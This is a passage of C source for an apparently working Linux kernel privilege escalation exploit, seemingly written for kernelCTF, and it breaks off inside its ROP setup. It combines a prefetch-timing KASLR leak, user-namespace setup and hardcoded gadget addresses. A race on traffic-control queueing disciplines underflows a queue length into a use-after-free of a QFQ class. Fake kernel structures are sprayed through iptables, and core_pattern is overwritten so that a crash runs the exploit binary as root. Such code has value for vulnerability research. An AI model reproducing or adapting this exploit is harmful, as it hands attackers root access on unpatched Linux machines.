#define _GNU_SOURCE
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net_tstamp.h>
#include <linux/socket.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <net/if.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>
#include <byteswap.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/ipset/ip_set_bitmap.h>
#include <err.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_gact.h>
#include <linux/pkt_cls.h>
#include <limits.h>
#include <errno.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

uint64_t g_kernel_base = 0xffffffff81000000;
// define for kernelctf server, undefine for GH actions repro
// #define KASLR_INTEL

// kernfs_pr_cont_buf
#define KERNFS_ADDR (0xffffffff84716940 - 0xffffffff81000000 + g_kernel_base)
// ret
#define LEAVE (0xffffffff8157d343 - 0xffffffff81000000 + g_kernel_base)
// qdisc_leaf
#define QDISC_LEAF (0xffffffff81e85fa0 - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff81133edd: pop r12; pop r15; ret;
#define POP2_RET (0xffffffff81133edd - 0xffffffff81000000 + g_kernel_base)
#define POP_RET (POP2_RET + 2)
#define TESTRET (POP_RET + 2)

#define POP_RDI (0xffffffff821f1a4d - 0xffffffff81000000 + g_kernel_base)
#define POP_RSI (0xffffffff8223c6f0 - 0xffffffff81000000 + g_kernel_base)
#define POP_RDX (0xffffffff81d88e32 - 0xffffffff81000000 + g_kernel_base)
// _copy_from_user
// #define COPY_FROM_USER (0xffffffff8187db00 - 0xffffffff81000000 + g_kernel_base)
#define STRCPY (0xffffffff821bc6f0 - 0xffffffff81000000 + g_kernel_base)
#define MSLEEP (0xffffffff81232f10 - 0xffffffff81000000 + g_kernel_base)
#define CORE_PATTERN (0xffffffff83bbace0 - 0xffffffff81000000 + g_kernel_base)

// add stuff
#define JMP_RAX (0xffffffff821f5fbe - 0xffffffff81000000 + g_kernel_base)
#define POP_RAX (0xffffffff8223f9a5 - 0xffffffff81000000 + g_kernel_base)

/* common utils */
void fatal(const char *msg)
{
    printf("[Fatal!] ");
    puts(msg);
    fflush(stdout);
    fflush(stderr);
    exit(EXIT_FAILURE);
}

#define SYSOK(x) ({                     \
    typeof(x) __res = (x);              \
    if (__res != (typeof(x))0)          \
        err(1, "[fail] SYSOK(" #x ")"); \
    __res;                              \
})

void set_cpu(int c)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(c, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}
/* common utils end */

/*KASLR leak*/
#define MIN_STEXT 0xffffffff81000000
#define MAX_STEXT 0xffffffffbb000000
#define BASE_INC 0x1000000
#define SYS_GETUID 0x1a7440

inline __attribute__((always_inline)) size_t rdtsc_begin()
{
    size_t a, d;
    asm volatile(
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) size_t rdtsc_end()
{
    size_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile("prefetchnta (%0)" : : "r"(p));
    asm volatile("prefetcht2 (%0)" : : "r"(p));
}

size_t onlyreload(void *addr)
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

size_t kaslr_leak()
{
    size_t base = -1;
#ifdef KASLR_INTEL
    const int tries1 = 1000, tries2 = 1000;

    while (base == ~0ULL)
    {
        size_t time;
        size_t min = -1;

        size_t addr = 0xffffffff80000000;
        for (int i = 0; i < tries1; i++)
        {
            time = onlyreload((void *)addr);
            min = min < time ? min : time;
        }

        for (int i = 0; i < tries2; i++)
        {
            for (addr = MIN_STEXT; addr <= MAX_STEXT; addr += BASE_INC)
            {
                time = onlyreload((void *)(addr + SYS_GETUID));
                if (time < min && addr < base)
                {
                    base = addr;
                }
            }
        }
    }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 7
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

    while (1)
    {
        uint64_t bases[NUM_TRIALS] = {0};

        for (size_t vote = 0; vote < NUM_TRIALS; vote++)
        {
#define TIMES_LEN ((END - START) / STEP)
            size_t times[TIMES_LEN] = {};
            uint64_t addrs[TIMES_LEN];

            for (size_t ti = 0; ti < TIMES_LEN; ti++)
            {
                times[ti] = ~0;
                addrs[ti] = START + STEP * (uint64_t)ti;
            }

            for (size_t i = 0; i < 16; i++)
            {
                for (size_t ti = 0; ti < TIMES_LEN; ti++)
                {
                    uint64_t addr = addrs[ti];
                    size_t t = onlyreload((void *)addr);
                    if (t < times[ti])
                    {
                        times[ti] = t;
                    }
                }
            }

            uint64_t max = 0;
            int max_i = 0;
            for (size_t ti = 0; ti < TIMES_LEN - WINDOW_SIZE; ti++)
            {
                uint64_t sum = 0;
                for (size_t i = 0; i < WINDOW_SIZE; i++)
                {
                    sum += times[ti + i];
                }
                if (sum > max)
                {
                    max = sum;
                    max_i = ti;
                }
            }

            bases[vote] = addrs[max_i];
        }

        size_t c = 0;
        for (size_t i = 0; i < NUM_TRIALS; i++)
        {
            if (c == 0)
            {
                base = bases[i];
            }
            else if (base == bases[i])
            {
                c++;
            }
            else
            {
                c--;
            }
        }

        c = 0;
        for (size_t i = 0; i < NUM_TRIALS; i++)
        {
            if (base == bases[i])
            {
                c++;
            }
        }
        if (c > NUM_TRIALS / 2)
        {
            break;
        }

        printf("majority vote failed:\n");
        printf("base = %zx with %zu votes\n", base, c);
    }
#endif
    return base;
}
/*KASLR leak end*/

// Unshare stuff
// Write to a file so we can set our user ids
int write_mapping(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
    {
        printf("Failed to open %s: %s\n", path, strerror(errno));
        return -1;
    }

    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content))
    {
        printf("Failed to write to %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

void setup_userns(void)
{
    // Unshare into new user namespace
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) == -1)
    {
        printf("unshare failed: %s\n", strerror(errno));
        exit(-1);
    }

    // First disable setgroups
    if (write_mapping("/proc/self/setgroups", "deny") == -1)
    {
        printf("Failed to disable setgroups\n");
        exit(-1);
    }

    // Then map our UID and GID
    if (write_mapping("/proc/self/uid_map", "0 1000 1") == -1 ||
        write_mapping("/proc/self/gid_map", "0 1000 1") == -1)
    {
        printf("Failed to write ID mappings\n");
        exit(-1);
    }
}

/*netlink utils*/
struct netlink_send_cb_struct
{
    void (*cb)(char *, size_t, void *);
    void *cb_out;
};

int __netlink_send(int fd, const void *nlh, size_t size, char *nlbuf, size_t nlbuf_sz, int has_done_msg, struct netlink_send_cb_struct *cb_info)
{
    char nlbuf_cb_scratch[1024];
    struct iovec iov = {
        .iov_base = (void *)nlh,
        .iov_len = size,
    };
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    if (sendmsg(fd, &msg, 0) < 0)
    {
        perror("sendmsg()");
        return -1;
    }

    if (!nlbuf)
    {
        // we're done here. no need to receive a response
        return 0;
    }

    ssize_t ret = recvfrom(fd, nlbuf, nlbuf_sz, 0, NULL, NULL);
    if (ret == -1)
    {
        perror("recvfrom()");
        return -1;
    }

    if (has_done_msg)
    {
        ssize_t ret2 = recvfrom(fd, &nlbuf_cb_scratch, sizeof(nlbuf_cb_scratch), 0, NULL, NULL); // done msg  (not all requests have this)
        if (ret2 == -1)
        {
            perror("recvfrom()");
            return -1;
        }
    }

    struct nlmsghdr *response_nlh = (struct nlmsghdr *)nlbuf;
    {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(response_nlh);
        if (err->error)
        {
            fprintf(stderr, "Netlink Result: %s\n", strerror(-err->error));
            return -err->error;
        }
    }

    if (cb_info)
        cb_info->cb(nlbuf, ret, cb_info->cb_out);
    return 0;
}

int netlink_send(int fd, const struct nlmsghdr *nlh)
{
    char nlbuf[4096] = {0}; // Buffer to store the response
    return __netlink_send(fd, nlh, nlh->nlmsg_len, nlbuf, sizeof(nlbuf), 0, NULL);
}

int netlink_send_noack(int fd, const struct nlmsghdr *nlh)
{
    return __netlink_send(fd, nlh, 0, 0, 0, 0, NULL);
}

int netlink_open(int proto)
{
    struct sockaddr_nl addr = {0};
    addr.nl_family = AF_NETLINK;

    int s = socket(AF_NETLINK, SOCK_RAW, proto);
    if (s < 0)
    {
        perror("socket()");
        return s;
    }
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("bind()");
        return -1;
    }

    return s;
}
/*netlink utils end*/

/*interface code start*/
int set_interface_flags(int sock, const char *ifname, int flags, int change)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[64];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_index = if_nametoindex(ifname);
    if (req.ifm.ifi_index == 0)
    {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    // Set the interface flags
    req.ifm.ifi_change = change;
    req.ifm.ifi_flags = flags;

    // Send the netlink message
    if (netlink_send(sock, &req.nlh))
    {
        perror("send_netlink_message");
        close(sock);
        return -1;
    }

    return 0;
}

// Function to bring an interface up
int set_interface_up(int fd, const char *ifname)
{
    return set_interface_flags(fd, ifname, IFF_UP, IFF_UP);
}

// Helper function to add rtattr to netlink message
static void add_rtattr(struct nlmsghdr *nlh, int type, const void *data, int len)
{
    struct rtattr *rta;
    int rtalen = RTA_LENGTH(len);

    rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = rtalen;
    if (data)
    {
        memcpy(RTA_DATA(rta), data, len);
    }
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + rtalen;
}

int create_dummy_interface(int sock, const char *ifname)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[256];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_type = 0;
    req.ifm.ifi_index = 0;

    // Add interface name attribute
    add_rtattr(&req.nlh, IFLA_IFNAME, ifname, strlen(ifname) + 1);

    // Add linkinfo attribute for dummy type
    struct rtattr *linkinfo = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nlh.nlmsg_len));
    linkinfo->rta_type = IFLA_LINKINFO;
    linkinfo->rta_len = RTA_LENGTH(0);
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_LENGTH(0);

    // Add kind attribute inside linkinfo
    const char *kind = "dummy";
    struct rtattr *kind_attr = (struct rtattr *)(((char *)linkinfo) + RTA_LENGTH(0));
    kind_attr->rta_type = IFLA_INFO_KIND;
    kind_attr->rta_len = RTA_LENGTH(strlen(kind) + 1);
    memcpy(RTA_DATA(kind_attr), kind, strlen(kind) + 1);

    // Update linkinfo length
    linkinfo->rta_len = RTA_LENGTH(RTA_LENGTH(strlen(kind) + 1));
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_LENGTH(strlen(kind) + 1);

    // Send the netlink message using the new function
    return netlink_send(sock, &req.nlh);
}

// Function to add IP address to interface
int add_ip_address(int sock, const char *ifname, const char *ip_addr, int prefix_len)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifaddrmsg ifa;
        char buf[256];
    } req;

    struct in_addr addr;

    // Convert IP address string to binary
    if (inet_pton(AF_INET, ip_addr, &addr) != 1)
    {
        fprintf(stderr, "Invalid IP address: %s\n", ip_addr);
        return -1;
    }

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
    req.nlh.nlmsg_type = RTM_NEWADDR;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface address message
    req.ifa.ifa_family = AF_INET;
    req.ifa.ifa_prefixlen = prefix_len;
    req.ifa.ifa_flags = IFA_F_PERMANENT;
    req.ifa.ifa_scope = RT_SCOPE_UNIVERSE;
    req.ifa.ifa_index = if_nametoindex(ifname);

    if (req.ifa.ifa_index == 0)
    {
        perror("if_nametoindex");
        return -1;
    }

    // Add the IP address attributes
    add_rtattr(&req.nlh, IFA_LOCAL, &addr, sizeof(addr));
    add_rtattr(&req.nlh, IFA_ADDRESS, &addr, sizeof(addr));

    // Send the netlink message using the new function
    return netlink_send(sock, &req.nlh);
}
/*interface code end*/

/*requests*/
char *PWN_DST_IP = "127.0.0.1";
int _send_req(int priority, int no_block)
{
    int sock;
    struct sockaddr_in server;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("Failed to create socket");
        return 1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0)
    {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }

    if (!no_block)
    {
        // Set socket to non-blocking mode
        int flags = fcntl(sock, F_GETFL, 0);
        if (flags < 0)
        {
            perror("Failed to get socket flags");
            close(sock);
            return 1;
        }
        if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0)
        {
            perror("Failed to set socket to non-blocking");
            close(sock);
            return 1;
        }
    }

    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, PWN_DST_IP, &server.sin_addr) <= 0)
    {
        perror("Invalid address");
        close(sock);
        return 1;
    }

    // Send empty datagram
    if (sendto(sock, "", 0, 0, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Failed to send");
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}

int send_req(int priority)
{
    return _send_req(priority, 0);
}

int send_req_noblock(int priority)
{
    return _send_req(priority, 1);
}
/*requests end*/

/*util functions for tc*/
int get_qdisc_handle(__u32 *h, const char *str)
{
    *h = 0;
    __u32 maj;
    char *p;

    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str || maj >= (1 << 16))
        return -1;
    maj <<= 16;
    if (*p != ':' && *p != 0)
        return -1;
ok:
    *h = maj;
    return 0;
}

int get_tc_classid(__u32 *h, const char *str)
{
    __u32 maj, min;
    char *p;

    maj = TC_H_ROOT;
    if (strcmp(str, "root") == 0)
        goto ok;
    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str)
    {
        maj = 0;
        if (*p != ':')
            return -1;
    }
    if (*p == ':')
    {
        if (maj >= (1 << 16))
            return -1;
        maj <<= 16;
        str = p + 1;
        min = strtoul(str, &p, 16);
        if (*p != 0)
            return -1;
        if (min >= (1 << 16))
            return -1;
        maj |= min;
    }
    else if (*p != 0)
        return -1;

ok:
    *h = maj;
    return 0;
}

static __u32 get_id(const char *s_class)
{
    if (s_class[strlen(s_class) - 1] == '0')
    {
        // eg 2.0
        __u32 result;
        SYSOK(get_qdisc_handle(&result, s_class));
        return result;
    }
    else
    {
        // eg 2.1
        __u32 result;
        SYSOK(get_tc_classid(&result, s_class));
        return result;
    }
}
/*util functions for tc end*/

/*kernfs section*/
uint8_t kernfs_data[4096] = {0};

// Send controlled data to deducible address in kernel from kernel base
void fill_kernfs_buf(void)
{
    // Create a lockfile that we can actually use
    setenv("XTABLES_LOCKFILE", "/tmp/xtables.lock", 1);

    // Redirect stdout and stderr to /dev/null
    int devnull = open("/dev/null", O_WRONLY);
    if (devnull < 0)
    {
        exit(-1);
    }
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);

    // Execute iptables to fill buffer
    execl("./xtables-legacy-multi", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path",
          kernfs_data, (char *)NULL);
}

size_t validate_kernfs_val(size_t val)
{

    for (int i = 0; i < 8; i++)
    {
        if (((val >> (i * 8)) & 0xFF) == 0)
        {
            fatal("val has null!");
            return 1;
        }
    }
    return val;
}

// Send kernfs data to the kernel
void send_kernfs_data(void)
{
    int pid = fork();
    if (pid < 0)
    {
        perror("fork");
        exit(-1);
    }

    // Child
    if (pid == 0)
    {
        fill_kernfs_buf(); // Doesn't return
    }

    // Parent, wait for child to finish
    int status;
    waitpid(pid, &status, 0);
}
/*kernfs section end*/

#include "qdisc.h"
#include "tc_filters.h"

// exp code start
const char desired_core_pattern[] = "|/proc/%P/fd/666 %P";
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {0};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, desired_core_pattern, strlen(desired_core_pattern)) == 0;
}

void crash()
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    while (check_core() == 0)
    {
        usleep(100 * 1000); // 0.1ms
    }

    puts("[+] core pattern overwritten");
    puts("[~] crashing program to trigger core_pattern");
    /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
    *(size_t *)0 = 0;
}

// standard service curve for hfsc
struct tc_service_curve fsc = {
    .d = 1,
    .m1 = UINT_MAX,
    .m2 = UINT_MAX};

void setup_spam_tree(int fd, unsigned int spam_parent_handle)
{
    // spam: this stage increases the delay after prio_tune unlock & resetting sfq
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("2:0"), spam_parent_handle, 1));
    SYSOK(create_class_hfsc(fd, get_id("2:1"), get_id("2:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("2:2"), get_id("2:0"), NULL, &fsc, NULL));

    SYSOK(create_qdisc_sfq_spam(fd, get_id("4:0"), get_id("2:1")));
    SYSOK(create_qdisc_plug1024(fd, get_id("5:0"), get_id("2:2")));
    SYSOK(create_filter(fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:3"))); // direct packets hitting prio into this qdisc
    SYSOK(send_req(get_id("2:2")));

    for (int j = 0; j < 1; j++) // can be tweaked to increase the delay
    {
        for (int i = 0; i < 0x10000 - 127 - 1; i++)
        {
            // we can send non-blocking requests here because we don't need an exact number.
            // anyway, by the time we finish setup, most packets have gone through.
            SYSOK(send_req_noblock(0x40000 + i));
        }
    }

    SYSOK(delete_filter(fd, get_u32_handle("800::800"), get_id("1:0")));
}

int setup_race(int fd, unsigned int prio_parent_handle)
{
    SYSOK(create_qdisc_prio(fd, get_id("1:0"), prio_parent_handle, 4));

    setup_spam_tree(fd, get_id("1:3"));

    // continue setting up the rest of the tree
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("3:0"), get_id("1:4"), 1));
    SYSOK(create_class_hfsc(fd, get_id("3:1"), get_id("3:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("3:2"), get_id("3:0"), NULL, &fsc, NULL));
    SYSOK(create_qdisc_plug1024(fd, get_id("6:0"), get_id("3:2")));

    SYSOK(create_filter(fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:4"))); // filter packets into the hfsc qdisc containing sfq
    SYSOK(send_req(get_id("3:2")));                                                     // enters plug

    if (fork() == 0)
    {
        set_cpu(1);
        // register timer on other cpu
        // This sfq qdisc will have 2 flows, 2 slots.
        SYSOK(create_qdisc_sfq(fd, get_id("7:0"), get_id("3:1"), INT_MAX)); // negative delay
        SYSOK(send_req(get_id("7:1")));                                     // go into sfq slot
        // now, basically nothing will run on CPU 1 because the timer always runs. until the timer is disabled when the qdisc is deleted.
        exit(0);
    }

    // wait for packet to be enqueued
    while (1)
    {
        usleep(1000 * 10);
        struct qdisc_stats stats;
        if (dump_qdisc_v2(fd, get_id("7:0"), &stats) == 0 && stats.qlen == 1)
            break;
    }

    return 0;
}

int do_race(int fd, unsigned int prio_parent_handle)
{
    int exp_success = 0;
    puts("[~] starting race!");

    // race: we send packets to saturate sfq and begin prio tune before the next timer cycle
    SYSOK(send_req_noblock(get_id("7:2"))); // we make the first 2 requests non-blocking so that we can send all 3 requests ASAP
    SYSOK(send_req_noblock(get_id("7:2")));
    SYSOK(send_req(get_id("7:2"))); // waiting for the 3rd packet is good enough for all 3 packets to be received (most of the time)

    // one possible failure point is for the timer to hit while sfq_dequeue is running
    // this crashes the system, so we want to avoid this
    // to that end, we:
    // 1. increase the delay window (spam above)
    // 2. only send a total of 3 packets to prevent a double dequeue (which would increase the chances of hitting the failure point)

    /* notes about sfq rehashing ==========================
    creating sfq gives 2 flows and 2 slots for a limit of 4. rehashing almost certainly drops a packet when there are 4 packets. when there are only 3, it drops a packet ~1/8 times.
    because the timer runs so rapidly, it usually drops the 4th packet before prio_tune is triggered. then, it is a matter of lucking out and dropping the 3rd packet while prio_tune is running.
    increasing the time taken to destroy the other band (spam) increases the odds here, but it is far from 100%. so we retry until we succeed.
    */

    // prune (prio_tune)
    SYSOK(create_qdisc_prio(fd, get_id("1:0"), prio_parent_handle, 2));

    // ATP, the parent prio has qlen = -1

    // check success
    {
        struct qdisc_stats stats;
        SYSOK(dump_qdisc_v2(fd, get_id("1:0"), &stats));
        if (stats.qlen == ~0U) // underflow
        {
            puts("[+] race success!");
            exp_success = 1;
        }
        else
        {
            printf("[-] race fail (backlog %ub, qlen %up)\n", stats.backlog, stats.qlen);
        }
    }

    return exp_success;
}

void reset_race(int fd, unsigned int prio_parent_handle)
{
    SYSOK(delete_filter(fd, get_u32_handle("800::800"), get_id("1:0")));
    SYSOK(delete_qdisc(fd, get_id("1:0"), prio_parent_handle, "prio"));
}

void underflow_prio_qlen(const int fd, unsigned int prio_parent)
{
    for (int i = 0;; i++)
    {
        printf("[~] Attempt %d\n", i);
        setup_race(fd, prio_parent);
        int success = do_race(fd, prio_parent);
        if (success)
        {
            printf("[+] SUCCESS on Attempt %d\n", i);
            break;
        }
        // reset
        reset_race(fd, prio_parent);
    }
}

void setup_main_tree(int fd, unsigned int main_parent_handle)
{
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("99:0"), main_parent_handle, 1));
    struct tc_service_curve fsc = {
        .d = 1,
        .m1 = UINT_MAX,
        .m2 = UINT_MAX};
    SYSOK(create_class_hfsc(fd, get_id("99:1"), get_id("99:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("99:2"), get_id("99:0"), NULL, &fsc, NULL)); // for triggering dequeue later

    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("100:0"), get_id("99:1"), 1));
    SYSOK(create_class_hfsc(fd, get_id("100:1"), get_id("100:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("100:3"), get_id("100:0"), NULL, &fsc, NULL));

    SYSOK(create_qdisc_plug1024(fd, get_id("102:0"), get_id("100:3")));
    const int stored_packets = 2;
    for (int i = 0; i < stored_packets; i++)
    {                                     // note: minimizing the number of packets here makes the race succeed better
        SYSOK(send_req(get_id("100:3"))); // plug
    }
}

void setup_uaf(int fd, unsigned int main_parent_handle)
{
    setup_main_tree(fd, main_parent_handle);
    unsigned int prio_parent = get_id("100:1");
    underflow_prio_qlen(fd, prio_parent);

    // At this point, prio has qlen = -1, plug has qlen = stored_packets, parent drr has qlen = (stored_packets-1) (due to double remove)
    // trigger drop (stored_packets) (qdisc_tree_reduce_backlog)
    SYSOK(delete_qdisc(fd, get_id("102:0"), get_id("100:3"), "plug"));

    // At this point, the root qfq has qlen = -1, and its child hfsc has qlen = -1
    // So, we increase its child's qlen back to zero, then delete it to create the dangling pointer
    SYSOK(create_qdisc_plug1024(fd, get_id("105:0"), get_id("1:1")));
    SYSOK(send_req(get_id("1:1")));
    SYSOK(create_qdisc_plug1024(fd, get_id("f1:0"), get_id("f0:2")));

    puts("[~] deleting class");
    // now, we can go ahead and delete the victim qfq class
    SYSOK(delete_filter(fd, get_u32_handle("800::800"), get_id("f0:0")));
    SYSOK(send_req(get_id("f0:2")));                                // send to plug. we use unplug to trigger qfq_dequeue later. make sure to send this request before deleting the class, because qfq_enqueue will use list_add, which does sanity checks on the list ptrs. these checks fail on mitigation when the class is freed, as the ptrs are no longer valid.
    SYSOK(delete_class(fd, get_id("f0:1"), get_id("f0:0"), "drr")); // free
}

void setup_reclaim_qfq_class(int fd)
{
    // To make things cleaner, we will create a new device and setup the drr there instead.
    SYSOK(create_dummy_interface(fd, "dummy1"));
    SYSOK(set_interface_up(fd, "dummy1"));
    SYSOK(add_ip_address(fd, "dummy1", "192.168.100.1", 24)); // ip addr add 192.168.100.1/24 dev dummy1
    // SYSOK(system("./iproute2-4.0.0/ip addr add 192.168.100.1/24 dev dummy1"));

    PWN_TC_QDISC_INTERFACE = "dummy1";
    PWN_DST_IP = "192.168.100.2";

    SYSOK(create_qdisc(fd, get_id("1:0"), TC_H_ROOT));
    SYSOK(create_class(fd, get_id("1:1"), get_id("1:0")));
    SYSOK(create_qdisc_plug1024(fd, get_id("2:0"), get_id("1:1")));
    SYSOK(send_req(get_id("1:1")));

    // restore settings to continue previous exploit
    PWN_DST_IP = "127.0.0.1";
    PWN_TC_QDISC_INTERFACE = "lo";
}

void do_reclaim_qfq_class(int fd, const size_t desired_value)
{
    PWN_TC_QDISC_INTERFACE = "dummy1";
    PWN_DST_IP = "192.168.100.2";

    const int n = 48;
    for (int i = 0; i < n; i++)
    {
        SYSOK(create_class(fd, get_id("1:2") + i, get_id("1:0")));
        SYSOK(modify_class_drr_quantum(fd, get_id("1:2") + i, get_id("1:0"), (uint)(desired_value >> 32)));
    }

    for (int i = 0; i < n; i++)
        SYSOK(send_req(get_id("1:2") + i));

    for (int i = 0; i < n; i++)
        SYSOK(modify_class_drr_quantum(fd, get_id("1:2") + i, get_id("1:0"), (uint)(desired_value & 0xffffffff)));

    // restore settings to continue previous exploit
    PWN_DST_IP = "127.0.0.1";
    PWN_TC_QDISC_INTERFACE = "lo";
}

void setup_root_hierachy(int fd)
{
    SYSOK(create_qdisc_qfq(fd, get_id("f0:0"), TC_H_ROOT));
    SYSOK(create_class_qfq(fd, get_id("f0:1"), get_id("f0:0")));                          // victim class (will be UAF)
    SYSOK(create_class_qfq(fd, get_id("f0:2"), get_id("f0:0")));                          // sibling to victim class
    SYSOK(create_filter(fd, get_u32_handle("800::800"), get_id("f0:0"), get_id("f0:1"))); // filter into victim class by default
}

void prepare_rop()
{
    memset(kernfs_data, 'a', sizeof(kernfs_data)); // kernfs needs to be a string, so remove null bytes
    // the first 8 bytes aren't used for anything
    memcpy(kernfs_data, "/a/b/", 5); // allows us to use slashes in the rest of the exploit (used in the core_pattern string)

#define QDISC_OPS_OFFS_PEEK 56
#define QDISC_OPS_OFFS_CL_OPS 0x8
#define KERNFS_FAKE_CL_OPS_OFFSET 64

    char *fake_qdisc_ops = (char *)kernfs_data;
    *(size_t *)&fake_qdisc_ops[QDISC_OPS_OFFS_PEEK] = validate_kernfs_val(QDISC_LEAF);
    *(size_t *)&fake_qdisc_ops[QDISC_OPS_OFFS_CL_OPS] = validate_kernfs_val(KERNFS_ADDR + KERNFS_FAKE_CL_OPS_OFFSET); // ->cl_ops

